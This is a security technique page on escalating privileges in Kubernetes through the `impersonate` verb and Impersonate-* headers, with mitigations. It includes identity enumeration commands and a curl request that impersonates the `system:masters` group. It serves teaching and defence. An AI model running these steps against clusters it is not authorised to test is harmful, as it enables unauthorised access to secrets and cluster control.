---
title: Kubernetes Impersonation
description: Abusing the impersonate verb and Impersonate-* headers so the API server authorizes requests as another user, group, or ServiceAccount
category: offensive
impact: >-
  If you can impersonate, you don’t need someone else’s token. You can call the API as them, get to things your own account can’t, and it often looks like everyday cluster traffic.
mitigation:
  - Keep `impersonate` on `users`, `groups`, and `serviceaccounts` rare. Bind it with tight ClusterRoles and explicit subjects, not wide catch-all roles.
  - Do not give `impersonate` to automation, CI, or namespace operators unless there is a clear need.
  - Review ClusterRoles and ClusterRoleBindings for `impersonate`. Namespaced Roles cannot express impersonation the way people expect; mistakes usually show up as sloppy ClusterRoles instead.
  - If you use time-limited elevation, keep the impersonation grant as narrow as the workflow allows.
mitreTechniques:
  - T1078
references: |
  - [User impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) — Kubernetes authentication docs
  - [Referring to resources (RBAC)](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#referring-to-resources) — Impersonation and cluster-scoped rules
---

Kubernetes can evaluate an API call as if another user, UID, group, or ServiceAccount made it. Admins use that with tools like `kubectl --as` and `--as-group`. The same mechanism turns offensive when `impersonate` is granted too broadly: an attacker with API access can ride a more privileged identity without ever touching its credentials.

## RBAC and the `impersonate` verb

You need `impersonate` on whatever you are faking (`user`, `uid`, `group`, and so on). With the RBAC authorizer, those permissions live in rules against the core API group and `authentication.k8s.io`.

Put only what you need in `resources`. One role might allow `impersonate` on `users` only; another might use `groups` or `serviceaccounts`. You do not have to list all of them.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: impersonator
rules:
  - apiGroups: [""]
    resources: ["users", "groups"]
    verbs: ["impersonate"]
```

`resourceNames` narrows the rule to particular names (how the string looks depends on whether you are targeting a user, group, or ServiceAccount). If you leave `resourceNames` out, the rule applies to any name that matches the rest of the rule.

UID impersonation uses `authentication.k8s.io`, resource `uids`. `resourceNames` lists the exact UID strings allowed. Those are the same values you send as `Impersonate-Uid` on the request. If you omit `resourceNames`, any UID that matches the rule is allowed.

A concrete source for a sample value is any object’s `metadata.uid` (a UUID the API server assigned). For example, the ServiceAccount you care about has one UID:

```bash
kubectl get serviceaccount default -n default -o jsonpath='{.metadata.uid}{"\n"}'
```

You might see the same class of string on a Pod, Namespace, or other resource:

```bash
kubectl get pods -A -o custom-columns=NAME:.metadata.name,UID:.metadata.uid
```

Put that string into `resourceNames` and into `Impersonate-Uid` when you call the API. If you use an external IdP or a custom authenticator, the UID in `user.Info` might come from a token claim instead. In that case use whatever UID string your auth integration actually sets, not necessarily `metadata.uid` from an object.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: impersonator-uids
rules:
  - apiGroups: ["authentication.k8s.io"]
    resources: ["uids"]
    resourceNames: ["<YOUR_UID_HERE>"]
    verbs: ["impersonate"]
```

Extras (claims that map under `userextras/...`) also live under `authentication.k8s.io`. The resource path depends on the extra key and your cluster version, so take the exact names from the docs for your release.

## Why ClusterRole and ClusterRoleBinding

Impersonation has to be authorized with a ClusterRole plus ClusterRoleBinding. A namespaced Role plus RoleBinding is the wrong shape here. Roles are bound to a namespace. Users and groups in this RBAC check are not namespace objects, so you cannot spell “may impersonate this user” with a Role alone. ClusterRole rules are how you grant `impersonate` for identities that are not scoped to one namespace.

## `curl` and `Impersonate-*` headers

`kubectl --as` sends the same headers as a normal HTTP client: `Authorization` with the caller’s token, plus any `Impersonate-*` headers your RBAC allows. One illustrative pair is `Impersonate-User: arbitrary` with `Impersonate-Group: system:masters` (only if your rules allow impersonating that group).

Set `APISERVER` and `CACERT` to match how you reach the API:

- In a pod, the API is usually `https://kubernetes.default.svc` and the pod’s CA file is `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`.
- From your machine, print the API URL from kubeconfig and use it as `APISERVER`:

```bash
kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}{"\n"}'
```

```bash
TOKEN="<token-for-the-real-identity>"
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

curl --cacert "$CACERT" "$APISERVER/api/v1/namespaces" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: arbitrary" \
  -H "Impersonate-Group: system:masters"
```

You can add `Impersonate-Uid` or `Impersonate-Extra-...` when RBAC covers those attributes.

## Cheatsheet

RBAC uses virtual resource names for impersonation. The strings you put in `rules.resources` (and `rules.resourceNames`) depend on the attribute you impersonate:

| `apiGroups` | `resources` (rule) | What `resourceNames` refers to |
|-------------|-------------------|--------------------------------|
| `""` | `users` | Usernames your cluster accepts (OIDC `sub`, cert CN, static token user, etc.). |
| `""` | `groups` | Group names from your identity source (for example `system:masters`, OIDC groups). |
| `""` | `serviceaccounts` | ServiceAccount binding; `resourceNames` uses the account name, with namespace coming from the RoleBinding when the rule is namespaced. |
| `authentication.k8s.io` | `uids` | The exact UID string for `Impersonate-Uid` (often `metadata.uid` from an object, or a UID from your IdP). |
| `authentication.k8s.io` | `userextras/<key>` | Extra field keys (for example `userextras/scopes`). Exact suffix depends on version and config. |

Use bindings to discover user and group strings. For ServiceAccounts, emit the `system:serviceaccount:namespace:name` form. For UID strings, read `metadata.uid` (see above) or copy the value your identity provider attaches to the user.

### Users

```bash
# No native "list users" in Kubernetes — derive from RBAC bindings
kubectl get clusterrolebindings -o json | \
  jq -r '.items[].subjects[]? | select(.kind=="User") | .name'

kubectl get rolebindings -A -o json | \
  jq -r '.items[].subjects[]? | select(.kind=="User") | .name'
```

### Groups

```bash
kubectl get clusterrolebindings -o json | \
  jq -r '.items[].subjects[]? | select(.kind=="Group") | .name'

kubectl get rolebindings -A -o json | \
  jq -r '.items[].subjects[]? | select(.kind=="Group") | .name'
```

### ServiceAccounts

```bash
kubectl get serviceaccounts -A -o json | \
  jq -r '.items[] | "system:serviceaccount:" + .metadata.namespace + ":" + .metadata.name'
```

### UIDs

Grab a sample from an object’s `metadata.uid`, or from your identity stack if that is what populates `user.Info` for your cluster:

```bash
kubectl get serviceaccount default -n default -o jsonpath='{.metadata.uid}'
kubectl get pods -A -o custom-columns=NAME:.metadata.name,UID:.metadata.uid
```

## How an impersonation attack works

1. The attacker signs in as a weak identity (stolen ServiceAccount token, leaked kubeconfig, and the like).
2. That identity has `impersonate` on `users`, `groups`, `serviceaccounts`, UIDs, or extras.
3. They send requests with impersonation headers. Authorization runs as the impersonated identity, not only as the weak identity.
4. They reach secrets, cluster objects, or namespaces the weak identity could not touch on its own, as long as the impersonated identity can.

The API server still authenticates the real client. Authorization follows the impersonated subject.
